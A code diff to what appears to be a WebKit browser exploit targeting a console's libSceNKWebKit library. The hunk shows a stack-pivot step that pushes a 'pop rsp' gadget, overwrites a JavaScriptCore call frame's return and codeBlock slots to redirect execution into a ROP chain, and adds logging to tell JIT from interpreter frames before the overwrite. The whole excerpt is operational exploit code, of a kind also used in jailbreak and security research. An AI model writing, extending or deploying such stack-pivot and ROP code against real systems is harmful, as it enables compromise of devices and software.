@@ -374,10 +374,21 @@ async function prepare(p) {
             //    comparator return would leave it.
             push(gaddr("pop rsp")); push(retSlot);
 
+            // codeBlock (CF+0x10) tells the tier: a real heap pointer => the
+            // frame is baseline-JIT'd and its epilogue is a native ret off
+            // CF+0x08 (our pivot is valid); 0/small => LLInt (pivot assumption
+            // breaks). origRet in WebKit text vs a JIT-thunk region is a second
+            // signal. Log both BEFORE the risky overwrite (this line flushes).
+            const cbLooksHeap = (origCB.hi >>> 0) >= 0x8 && (origCB.hi >>> 0) <= 0x9ff;
+            const retInWk = origRet.hi === libSceNKWebKitBase.hi
+                && (origRet.low >>> 0) >= (libSceNKWebKitBase.low >>> 0);
             selfLog("SELF-PIVOT-ARM", "cf=0x" + cf.toString()
                 + "-retSlot=0x" + retSlot.toString()
                 + "-chainEntry=0x" + chainEntry.toString()
-                + "-origRet=0x" + origRet.toString());
+                + "-origRet=0x" + origRet.toString()
+                + "-origCB=0x" + origCB.toString()
+                + "-cbLooksHeap(JIT?)=" + cbLooksHeap
+                + "-retInWkText=" + retInWk);
 
             // Overwrite: retSlot = pop rsp (native ret lands here), cbSlot =
             // chainEntry (pop rsp then reads it). On our JS `return`, the
